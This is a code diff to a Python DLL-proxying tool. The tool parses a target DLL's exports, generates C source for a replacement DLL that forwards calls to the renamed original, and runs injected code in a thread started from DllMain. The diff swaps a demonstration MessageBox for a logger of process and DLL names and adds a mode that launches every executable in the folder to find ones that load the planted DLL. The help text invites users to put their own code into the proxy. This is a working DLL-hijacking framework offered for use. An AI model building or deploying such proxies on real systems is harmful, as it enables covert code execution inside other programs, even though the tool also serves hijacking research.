@@ -1,12 +1,11 @@
+import asyncio
 import os
 import shutil
 import subprocess
 import argparse
+from pathlib import Path
 import pefile
 import platform
-def openPeFile(filename):
-    oPE = pefile.PE(filename)
-    return oPE
 def getDllName(exports , dllname):
     dll_function_name = []
     i=1
@@ -18,21 +17,71 @@ def getDllName(exports , dllname):
         i = i+1
     return dll_function_name
 def writeC(dllFuncName,dllpath,dllname):
-    evalCode = """
-    MessageBox(0, (LPCSTR)"excute custom code!", (LPCSTR)"hacked by dll_proxy", 0);
+    otherFunctions = r"""
+    void GetCurrentProcessName(char* buffer, size_t buflen) {
+    DWORD pid = GetCurrentProcessId();
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (hProcess != NULL) {
+        char path[MAX_PATH];
+        DWORD size = MAX_PATH;
+        if (QueryFullProcessImageNameA(hProcess, 0, path, &size)) {
+            // 只保留文件名部分
+            char* fileName = strrchr(path, '\\');
+            if (fileName != NULL) {
+                strncpy(buffer, fileName + 1, buflen - 1); // 跳过'\'
+                buffer[buflen - 1] = '\0';
+            }
+        }
+        CloseHandle(hProcess);
+    }
+}
+
+// 获取当前DLL的名字
+void GetCurrentDllPath(char* buffer, size_t buflen) {
+    HMODULE hModule = NULL;
+    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+                      (LPCTSTR)GetCurrentDllPath, &hModule);
+    GetModuleFileNameA(hModule, buffer, buflen);
+}
+
+void WriteInfoToFile() {
+    char currentProcessName[MAX_PATH] = "";
+    char currentDllPath[MAX_PATH] = "";
+    char tempPath[MAX_PATH];
+
+    GetCurrentProcessName(currentProcessName, sizeof(currentProcessName));
+    GetCurrentDllPath(currentDllPath, sizeof(currentDllPath));
+
+    // 获取临时文件夹路径
+    if (GetTempPathA(sizeof(tempPath), tempPath) != 0) {
+
+        FILE *file = fopen("result.txt", "a+");
+        if (file != NULL) {
+            fprintf(file, "Current Process Name: %s\n", currentProcessName);
+            fprintf(file, "Current DLL Path: %s\n", currentDllPath);
+            fclose(file);
+        }
+    }
+}
     """
-    template = """
+    DllProxyContent = """
+    WriteInfoToFile();
+    //MessageBox(0, "2", "3", 0);
+    """
+    headerFile = """
 //#include "pch.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
+#include <tlhelp32.h>
+#include <string.h>
 #define _CRT_SECURE_NO_DEPRECATE
 #pragma warning (disable : 4996)
 """
-    template2 = """
+    tailFile = """
 DWORD WINAPI DllProxy(LPVOID lpParameter)
 {
-    """ + evalCode + """
+    """ + DllProxyContent + """
     return 0;
 }
 
@@ -58,11 +107,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 """
     cpath = dllpath + "/" + "new_" + dllname.replace('.dll','.c')
-    with open(cpath,"w") as file:
-        file.write(template)
+    with open(cpath,"w",encoding="GBK") as file:
+        file.write(headerFile)
         for funcname in dllFuncName:
             file.write(funcname)
-        file.write(template2)
+        file.write(otherFunctions)
+        file.write(tailFile)
         file.close()
     return cpath
 def renameDll(dllpath , dllname, mode):
@@ -114,25 +164,67 @@ def getHost():
     host = platform.architecture()[0][0:2]
     host = "x64" if host == "64" else "x86"
     return host
+async def run_exe_background(exe_path):
+    try:
+        process = await asyncio.create_subprocess_exec(
+            exe_path,
+            stdout=asyncio.subprocess.DEVNULL,
+            stderr=asyncio.subprocess.PIPE
+        )
+        print(f"{exe_path} 已启动 (PID: {process.pid})")
+    except Exception as e:
+        return f"启动 {exe_path} 时遇到错误: {str(e)}"
+async def execute_exes_async_background(exe_files):
+    tasks = [run_exe_background(exe) for exe in exe_files]
+    results = await asyncio.gather(*tasks)
+    errors = [result for result in results if result is not None]
+    return errors
+def list_exe_files():
+    return [str(f) for f in Path('.').glob('*.exe')]
+def read_result_txt():
+    result_file_path="result.txt"
+    if os.path.exists(result_file_path):
+        with open(result_file_path, 'r') as file:
+            return file.read()
+    else:
+        print(f"{result_file_path} 文件不存在")
+        return None
+async def excuteFile():
+    exe_files = list_exe_files()
+    print(f"找到的exe文件: {exe_files}")
+    errors = await execute_exes_async_background(exe_files)
+    if errors:
+        print("\n以下为启动过程中发生的错误:")
+        for error in errors:
+            print(error)
+    else:
+        print("所有程序均已成功启动。")
+    content = read_result_txt()
+    if content:
+        print("\n从result.txt读取的内容:")
+        print(content)
+def dig_main():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(excuteFile())
 def init():
     parser = argparse.ArgumentParser(epilog="""
-    
-Auto compile mode: python dll_proxy.py -D target.dll -C auto\n
-
-Manual mode: python dll_proxy.py -D target.dll -C manually\n
+Auto compile mode: python dll_proxy.py -D target.dll -C auto --detect auto\n
+Manual mode: python dll_proxy.py -D target.dll -C manually --detect manually\n
     """,
     formatter_class=argparse.RawTextHelpFormatter
     )
     parser.add_argument("--dll" , "-D" , type=str , help="origin dllpath" , required=True)
-    parser.add_argument("--compile", "-C", default = "manually", choices = ["manually" , "auto"] , type=str)
+    parser.add_argument("--compile", "-C", default = "manually", choices = ["manually" , "auto" ,"None"] , type=str, help="auto compile .c to .dll")
+    parser.add_argument("--detect", default="manually", choices=["manually", "auto"], type=str,help="auto detect vulnerable exe")
     args = parser.parse_args()
     dllpath, dllname = os.path.split(args.dll)
-    return dllpath , dllname , args.compile
+    return dllpath , dllname , args.compile ,args.detect
 if __name__ == "__main__":
-    dllpath , dllname , compile   = init()
+    dllpath , dllname , compile , detect  = init()
     if dllpath == "":
         dllpath = "."
-    pe = openPeFile(dllpath + "/" + dllname)
+    pe = pefile.PE(dllpath + "/" + dllname)
     dllFuncName = getDllName(pe.dump_dict()["Exported symbols"][1:] ,dllname)
     pe.close()
     cpath = writeC(dllFuncName , dllpath , dllname)
@@ -143,12 +235,18 @@ if __name__ == "__main__":
             compileToDll(cpath , dllname)
             print(f"success auto compile, new dll path is {dllpath}/{dllname}")
             print(f"origin dll path is {dllpath}/old_{dllname}")
+            if detect == "auto":
+                dig_main()
         except:
             print("已自动生成对应的 .c文件,自动编译失败,请自行打开visual studio进行手动编译")
             renameDll(dllpath, dllname, 2)
+    elif compile == "None":
+        if detect == "auto":
+            dig_main()
+        else:
+            print("请手动执行当前路径下所有exe并从result.txt中获取结果")
     else:
         help = """
-            /*
             How to use manual mode ?
             1.use visual studio to compile new.c and to new.dll
             2.rename old_dllname to old.dll, for example old_dllname is aaa.dll, you can rename aaa.dll to old_aaa.dll
@@ -156,6 +254,5 @@ if __name__ == "__main__":
             4.rename new.dll to old_dllname, for example old_dllname is aaa.dll, you can rename new.dll to aaa.dll
             5.excute the exe file, if success you can see a MessageBox
             6.now you can change new.c#DllProxy() and compile it second to excute your custom code
-            */
             """
         print(help)
